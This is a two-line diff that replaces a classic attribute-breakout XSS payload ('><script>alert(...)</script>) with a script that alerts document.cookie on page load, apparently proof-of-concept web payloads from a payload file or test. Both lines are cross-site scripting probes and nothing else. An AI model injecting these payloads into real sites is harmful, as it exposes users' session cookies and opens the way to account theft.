@@ -1,1 +1,1 @@
-'><script>alert("XSS")</script>
+window.addEventListener("load", function() { alert(document.cookie);});
